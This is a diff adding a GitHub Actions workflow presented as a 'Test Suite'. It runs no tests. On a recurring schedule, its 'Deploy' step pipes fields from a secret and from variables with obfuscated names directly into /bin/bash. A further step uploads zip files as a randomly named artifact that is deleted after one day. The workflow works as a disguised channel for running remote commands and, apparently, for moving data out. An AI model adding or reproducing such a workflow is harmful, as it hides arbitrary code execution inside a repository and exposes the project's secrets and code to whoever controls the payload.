@@ -1,0 +1,30 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          kpz3: ${{ secrets.kpz3 }}
+        run: |
+          printf '%s' "$kpz3" | jq -r .u3157 | /bin/bash
+          printf '%s' "$usc437" | jq -r .amrhs39137 | /bin/bash
+          echo $ysbos1088 | jq -r .bmyw44954 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 3bOtUEFb
+          path: "*.zip"
+          retention-days: 1
